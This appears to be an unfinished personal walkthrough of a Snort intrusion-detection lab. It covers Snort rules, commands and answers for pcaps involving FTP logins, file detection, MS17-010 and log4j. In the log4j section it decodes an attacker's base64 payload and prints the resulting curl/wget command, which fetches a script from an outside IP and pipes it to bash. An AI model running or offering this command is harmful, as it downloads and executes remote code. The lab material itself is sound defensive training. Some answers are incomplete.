## snortchallenges1.md
unfinished 2022/04

### Task2
1. `detect all TCP port 80`
   * alert tcp any 80 <> any any (msg: "TCP Port 80";sid:1000001;rev:1;)
   * alert tcp any any <> any 80 (msg: "TCP Port 80";sid:1000002;rev:1;)
   * -> 328
2. `destination address of packet 63`
   * write alerts file with '-A fast', grep file line numbers 'cat -n' and grep for line '63'
   * -> 145.254.160.237
3. `ACK number of packet 64?`
   * work around from above no longer works as we more info using '-A full'
   * ACK numbers tend to get reused, so I just tried a few
   * -> 0x38AFFFF3
4. `SEQ number of packet 62?`
   * -> 0x38AFFFF3
5. `TTL of packet 65`
   * -> 128
6. `soure IP of packet 65`
   * -> 145.254.160.237
7. `soure port of packet 65`
   * -> 3372

### Task3
1. `detect all TCP port 21`
   * alert tcp any 21 <> any any (msg: "TCP Port 21";sid:1000001;rev:1;)
   * alert tcp any any <> any 21 (msg: "TCP Port 21";sid:1000002;rev:1;)
   * -> 614
2. `ftp service name`
   * didnt find a nice filter, so 'sudo snort -X -v -r ftp-png-gif.pcap > fulldump'
   * cat fulldump \| grep 220
   * -> microsoft ftp service
3. `number of failed ftp logins`
   * alert tcp any any <> any any (msg: "Failed login FTP"; content:"530 "; sid:1000004;rev:1;)
   * -> 41
4. `number of successful ftp logins`
   * alert tcp any any <> any any (msg: "Login FTP"; content:"230 User"; sid:1000005;rev:1;)
   * -> 1
5. `number of failed logins with valid user`
   * alert tcp any any <> any any (msg: "User ok, need pass"; content:"331 Password"; sid:1000006;rev:1;)
   * -> 42
6. `number of failed logins with user Administrator`
   * alert tcp any any <> any any (msg: "User Admin, need pass"; content:"331 Password required for Administrator"; sid:1000007;rev:1;)
   * -> 7

### Task 4
1. `detect PNG files and find embedded software`
   * alert tcp any any <> any any (msg: "PNG File"; content: "PNG"; sid: 100001; rev:1;)
   * run snort with -d -e -v do get full package data: sudo snort -c local.rules -A full -d -e -v -l . -K ASCII -r ftp-png-gif.pcap 
   * -> Adobe ImageReady
2. `detect GIF file and find image format`
   * alert tcp any any <> any any (msg: "GIF File"; content: "GIF"; sid: 100002; rev:1;)
   * again run with -d -e -v, one of the logs will show the magic bytes for GIF
   * -> GIF89a

### Task 5
1. `detect torrent meta file`
   * alert tcp any any <> any any (msg: "torrent File"; content: ".torrent"; sid: 100001; rev:1;)
   * -> 2
2. `name of the torrent application`
   * run rule from 5.1. with -d -e -v, one of the logs will have application/x- header
   * -> bittorent
3. `MIME type of torrent file`
   * run rule from 5.1. with -d -e -v, the data we used in 2 is the MIME type
   * -> application/x-bittorrent
4. `hostname of the torrent metafile`
   * run rule from 5.1. with -d -e -v, look for 'Host:'
   * -> tracker2.torrentbox.com

### Task 6 - fix issues with local-X.rules files
1. missing space between last 'any' and '('
   * -> 16
2. 'port value missing in rule', must be 'icmp any any' instead of 'icmp any'
   * -> 68
3. double sid
   * -> 87
4. missing ';' after msg and double sid
   * -> 90
5. rule direction '<-' not allowed, missing ';' after msg and 'sid;' instead of 'sid:'
   * -> 155
6. missing 'nocase;' after content
   * -> 2
7. rule is looking for '.html', but is missing a message block
   * -> msg

### Task 7
1. `number of detected packets with given ruleset`
   * -> just run sudo snort -c local.rules -r ms-17-010.pcap
   * -> 25154
2. `number of packets with \IPC$`
   * alert tcp any any -> any any (msg: "IPC Detected!"; content: "\\IPC$";sid: 20244225; rev:3;)
   * -> 12
3. `request path`
   * sudo snort -c local-1.rules -A full -dev -l . -K ASCII -r ms-17-010.pcap
   * cat * \| grep \\\\ -A 2
   * -> \\192.168.116.138\IPC$
4. `CVSS v2 score of MS17-010 `
   * https://nvd.nist.gov/vuln/detail/cve-2017-0144
   * -> 9.3

### Task 8
1. `number of detected packets with given ruleset`
   * just run sudo snort -c local.rules -r log4j.pcap
   * -> 26
2. `number of rules triggered`
   * all used sids are 8 digits, thus we can just cat, grep, sort
   * cat alert | egrep -o '\\[1\\:[0-9]{8}\\:1\\]' | sort | uniq
   * -> 4
3. `first 6 digits of triggered rules`
   * use command from 8.2.
   * -> 210037
4. `write rule to filter payload between 770 and 855 bytes`
   * alert tcp any any -> any any (msg:"Size 770-855b"; dsize: 770<>855;sid:1000001; rev:1;)
   * -> 41
5. `encoding algorithm used`
   * if you cat all ASCII logs you will find utf-8 which is wrong, but also /Basic/Command/Base64/KGN1cmwgLX... which looks base64
   * it also makes sense in the context of log4j. As in which encoding was used to hide the payload when exploiting log4j
   * -> base64
6. `IP ID of the corresponding packet`
   * on the package you found in 8.5 scroll up and look for 'ID=' in the TCP header
7. `attackers command`
   * copy the base64 string, remove the hex representation if needed and convert using your favorite tool (e.g. cyberchef)
   * KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
   * -> (curl -s 45.155.205.233:5874/162.0.228.253:80\|\|wget -q -O- 45.155.205.233:5874/162.0.228.253:80)\|bash
8. `CVSS v2 score of log4j`
   * https://nvd.nist.gov/vuln/detail/CVE-2021-44228
   * -> 9.3
